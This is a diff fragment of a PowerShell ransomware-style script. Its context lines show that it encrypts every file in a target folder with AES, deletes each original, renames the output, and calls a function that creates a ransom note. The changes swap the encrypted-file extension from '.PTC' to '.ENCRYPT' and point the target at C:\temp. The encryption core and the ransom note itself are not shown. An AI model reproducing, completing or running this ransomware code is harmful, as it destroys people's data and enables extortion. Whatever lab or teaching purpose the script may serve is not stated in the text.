@@ -50,10 +50,10 @@ function Encrypt-File {
 
     # Remove the original file and rename the encrypted file
     Remove-Item -Path $filePath
-    Rename-Item -Path $tempFilePath -NewName ($filePath + ".PTC")
+    Rename-Item -Path $tempFilePath -NewName ($filePath + ".ENCRYPT")
 
     # Log the operation
-    Write-Output "Encrypted and renamed: $filePath to $($filePath + '.PTC')"
+    Write-Output "Encrypted and renamed: $filePath to $($filePath + '.ENCRYPT')"
 }
 
 # Function to create a ransom note
@@ -105,7 +105,7 @@ Write-Output "Generated AES Key: $([BitConverter]::ToString($key) -replace '-','
 Write-Output "Generated AES IV: $([BitConverter]::ToString($iv) -replace '-','')"
 
 # Get all files in the current directory
-$folderPath = "C:\Path\To\Target"  # Update this path to the folder you want to target
+$folderPath = "C:\temp"  # Update this path to the folder you want to target
 $files = Get-ChildItem -Path $folderPath -File
 
 foreach ($file in $files) {
